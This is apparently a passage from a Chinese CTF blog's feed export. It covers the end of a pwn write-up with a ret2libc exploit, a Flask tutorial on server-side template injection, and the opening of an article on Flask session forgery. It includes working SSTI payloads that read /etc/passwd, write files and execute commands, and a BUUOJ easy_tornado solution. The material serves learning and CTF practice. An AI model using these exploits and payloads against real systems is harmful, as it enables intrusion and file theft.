number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret2libc3<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'easy_rop'</span><span class="token punctuation">)</span> sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_libc_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write的libc地址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>write_libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_libc_addr<span class="token punctuation">)</span>libcbase<span class="token operator">=</span>write_libc_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc基址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>bin_sh<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system函数地址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh地址:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'f'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="2.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从flask到SSTI</title>
      <link href="/2019/11/19/flask-dao-ssti/"/>
      <url>/2019/11/19/flask-dao-ssti/</url>
      
        <content type="html"><![CDATA[<h3 id="flask基础知识"><a href="#flask基础知识" class="headerlink" title="flask基础知识"></a>flask基础知识</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"hello World！"</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>有两种途径来启用调试模式。一种是直接在应用对象上设置:</p><pre class=" language-python"><code class="language-python">app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>另一种是作为 run 方法的一个参数传入:</p><pre class=" language-python"><code class="language-python">app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>两种方法的效果完全相同。</p><h4 id="run函数参数"><a href="#run函数参数" class="headerlink" title="run函数参数"></a>run函数参数</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token operator">=</span>None<span class="token punctuation">,</span> port<span class="token operator">=</span>None<span class="token punctuation">,</span> debug<span class="token operator">=</span>None<span class="token punctuation">,</span> <span class="token operator">**</span>options<span class="token punctuation">)</span><span class="token punctuation">:</span></code></pre><p>参数</p><pre><code>host：主机，在使用run()启动服务的时候指定的IP地址，默认情况下是127.0.0.1port：端口，是run()启动服务的时候指定的运行端口，默认是5000debug：调试，如果需要进入调试模式，可以将这个选项设置成tureoptions:选项参数是将server的参数传送到Werkzeug server去处理。详情参考链接内容。</code></pre><h4 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h4><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    error <span class="token operator">=</span> None    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> valid_login<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                       request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> log_the_user_in<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            error <span class="token operator">=</span> <span class="token string">'Invalid username/password'</span>    <span class="token comment" spellcheck="true"># the code below is executed if the request method</span>    <span class="token comment" spellcheck="true"># was GET or the credentials were invalid</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">)</span></code></pre><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'the_file'</span><span class="token punctuation">]</span>        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'/var/www/uploads/uploaded_file.txt'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>如果你想知道上传前文件在客户端的文件名是什么，你可以访问 filename 属性。但请记住， 永远不要信任这个值，这个值是可以伪造的。如果你要把文件按客户端提供的文件名存储在服务器上，那么请把它传递给 Werkzeug 提供的 secure_filename() 函数:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> werkzeug <span class="token keyword">import</span> secure_filename@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'the_file'</span><span class="token punctuation">]</span>        f<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'/var/www/uploads/'</span> <span class="token operator">+</span> secure_filename<span class="token punctuation">(</span>f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>设置cookie</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/cookie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">'set_cookie'</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp</code></pre><p>获得cookie</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render1</span><span class="token punctuation">(</span>name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span></code></pre><p>删除cookie</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/del_cookie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_post</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">'delete_cookie'</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp</code></pre><h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/cookie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>name<span class="token operator">=</span>name<span class="token punctuation">)</span></code></pre><h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Logged in as %s'</span> <span class="token operator">%</span> escape<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'You are not logged in'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''        &lt;form action="" method="post">            &lt;p>&lt;input type=text name=username>            &lt;p>&lt;input type=submit value=Login>        &lt;/form>    '''</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># remove the username from the session if it's there</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># set the secret key.  keep this really secret:</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'A0Zr98j/3yX R~XHH!jmN]LWX/,?RT'</span></code></pre><h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>xss</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/xss/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>    html <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        &lt;h3>%s&lt;/h3>    '''</span><span class="token operator">%</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html<span class="token punctuation">)</span></code></pre><p>payload</p><pre><code>http://192.168.199.246/xss/?id=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>防御</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/test/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;h1>{{ code }}&lt;/h1>'</span><span class="token punctuation">,</span>code<span class="token operator">=</span>code<span class="token punctuation">)</span></code></pre><p>可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的</p><h3 id="SSTI文件读取-命令执行"><a href="#SSTI文件读取-命令执行" class="headerlink" title="SSTI文件读取/命令执行"></a>SSTI文件读取/命令执行</h3><p>服务器模板注入SSTI<br>基础<br>在Jinja2模板引擎中，<code>是变量包裹标识符。</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。<br>代码同xss<br>payload<br><code>http://192.168.199.246/ssti/?id=6</code><br>查看flask配置</p><pre><code>http://192.168.199.246/ssti/?id={{config}}</code></pre><h3 id="python2-3的命令执行和文件包含"><a href="#python2-3的命令执行和文件包含" class="headerlink" title="python2/3的命令执行和文件包含"></a>python2/3的命令执行和文件包含</h3><h4 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h4><p>文件读取或者写入</p><pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}</code></pre><p>任意文件写</p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')}}</code></pre><p>执行,先通过上一步的写，然后执行</p><pre><code>{{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre><h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><p>任意文件读取</p><pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()}}</code></pre><p>一句指令任意执行</p><pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}</code></pre><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="easy-tornado模板注入"><a href="#easy-tornado模板注入" class="headerlink" title="easy_tornado模板注入"></a>easy_tornado模板注入</h4><p>2个hint<br>一个是</p><pre><code>/hints.txtmd5(cookie_secret+md5(filename))</code></pre><p>一个是</p><pre><code>flag in /fllllllllllllag</code></pre><p>我们要获得cookie_secret<br>发现模板注入<br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=Error</code><br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=2</code><br>我们之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings<br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=</code><br>获得<br><code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;c60b48df-5a65-4b5e-bf46-94c3536c65e6&#39;}</code><br>所以得到<br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/file?filename=/fllllllllllllag&amp;filehash=55e8b48b796a17f8ce4efa065aeec935</code><br><code>flag{d9b60421-fffb-4eb1-9eb1-62e2c15be06c}</code></p><h4 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h4><p>优秀的人写的wp都如此优秀，佩服佩服<br><a href="https://ctftime.org/writeup/10895" target="_blank" rel="noopener">https://ctftime.org/writeup/10895</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask中session的那些事</title>
      <link href="/2019/11/19/flask-zhong-session-de-na-xie-shi/"/>
      <url>/2019/11/19/flask-zhong-session-de-na-xie-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h3><p>在写HCTF2018-admin题目的时候，遇到了flask中session伪造的问题，打算研究一下</p><h3 id="一、cookie和session的一些小姿势"><a href="#一、cookie和session的一些小姿势" class="headerlink" title="一、cookie和session的一些小姿势"></a>一、cookie和session的一些小姿势</h3><h5 id="1、cookie："><a href="#1、cookie：" class="headerlink" title="1、cookie："></a>1、cookie：</h5><p>在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登录成功后，第二次请求服务器依然不能知道当前请求是哪个用户。cookie的出现就是为了解决这个问题，第一次登录后服务器返回一些数据（cookie）给浏览器，然后浏览器保存在本地，当该用户发送第二次请求的时候，就会自动的把上次请求存储的cookie数据自动的携带给服务器，服务器通过浏览器携带的数据就能判断当前用户是哪个了。cookie存储的数据量有限，不同的浏览器有不同的存储大小，但一般不超过4KB。因此使用cookie只能存储一些小量的数据。</p><h5 id="2、session"><a href="#2、session" class="headerlink" title="2、session:"></a>2、session:</h5><p>session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。存储在服务器的数据会更加的安全，不容易被窃取。但存储在服务器也有一定的弊端，就是会占用服务器的资源，但现在服务器已经发展至今，一些session信息还是绰绰有余的。</p><h5 id="3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）"><a href="#3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）" class="headerlink" title="3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）"></a>3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）</h5><p>web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：</p><p>1、存储在服务端：通过cookie存储一个session_id，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个session_id，下次再次请求的时候，会把该session_id携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做server side session。</p><p>2、将session数据加密，然后存储在cookie中。这种专业术语叫做client side session。flask采用的就是这种方式，但是也可以替换成其他形式。</p><h3 id="二、源码分析一下"><a href="#二、源码分析一下" class="headerlink" title="二、源码分析一下"></a>二、源码分析一下</h3><p>他的session存储在客户端的cookie字段中，为了防止session篡改，flask进行了如下的处理，代码存放在flask模块中<code>python3\Lib\site-packages\flask\sessions.py</code>文件中。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SecureCookieSessionInterface</span><span class="token punctuation">(</span>SessionInterface<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""The default session interface that stores sessions in signed cookies    through the :mod:`itsdangerous` module.    """</span>    <span class="token comment" spellcheck="true">#: the salt that should be applied on top of the secret key for the</span>    <span class="token comment" spellcheck="true">#: signing of cookie based sessions.</span>    salt <span class="token operator">=</span> <span class="token string">"cookie-session"</span>    <span class="token comment" spellcheck="true">#: the hash function to use for the signature.  The default is sha1</span>    digest_method <span class="token operator">=</span> staticmethod<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#: the name of the itsdangerous supported key derivation.  The default</span>    <span class="token comment" spellcheck="true">#: is hmac.</span>    key_derivation <span class="token operator">=</span> <span class="token string">"hmac"</span>    <span class="token comment" spellcheck="true">#: A python serializer for the payload.  The default is a compact</span>    <span class="token comment" spellcheck="true">#: JSON derived serializer with support for some extra Python types</span>    <span class="token comment" spellcheck="true">#: such as datetime objects or tuples.</span>    serializer <span class="token operator">=</span> session_json_serializer    session_class <span class="token operator">=</span> SecureCookieSession    <span class="token keyword">def</span> <span class="token function">get_signing_serializer</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> app<span class="token punctuation">.</span>secret_key<span class="token punctuation">:</span>            <span class="token keyword">return</span> None        signer_kwargs <span class="token operator">=</span> dict<span class="token punctuation">(</span>            key_derivation<span class="token operator">=</span>self<span class="token punctuation">.</span>key_derivation<span class="token punctuation">,</span> digest_method<span class="token operator">=</span>self<span class="token punctuation">.</span>digest_method        <span class="token punctuation">)</span>        <span class="token keyword">return</span> URLSafeTimedSerializer<span class="token punctuation">(</span>            app<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span>            salt<span class="token operator">=</span>self<span class="token punctuation">.</span>salt<span class="token punctuation">,</span>            serializer<span class="token operator">=</span>self<span class="token punctuation">.</span>serializer<span class="token punctuation">,</span>            signer_kwargs<span class="token operator">=</span>signer_kwargs<span class="token punctuation">,</span>        <span class="token punctuation">)</span></code></pre><p>最后生成的session长这样<br><code>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code><br>比如我生成这样的<code>eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn4pw.6KQvoMiQZo1Ttjr4dFJ7e0AN45U</code><br>这是由<code>{&#39;_permanent&#39;: True, &#39;username&#39;: &#39;st4ck&#39;}</code>，密钥为<code>admin</code>生成的</p><h3 id="三、flask的session实战"><a href="#三、flask的session实战" class="headerlink" title="三、flask的session实战"></a>三、flask的session实战</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>session<span class="token keyword">import</span> os<span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'admin'</span>   <span class="token comment" spellcheck="true">#设置为24位的字符,每次运行服务器都是不同的，所以服务器启动一次上次的session就清除。</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'PERMANENT_SESSION_LIFETIME'</span><span class="token punctuation">]</span><span class="token operator">=</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#设置session的保存时间。</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>permanent<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token comment" spellcheck="true">#默认session的时间持续31天</span>    session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'st4ck'</span>    <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token comment" spellcheck="true">#获取session</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/get/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token 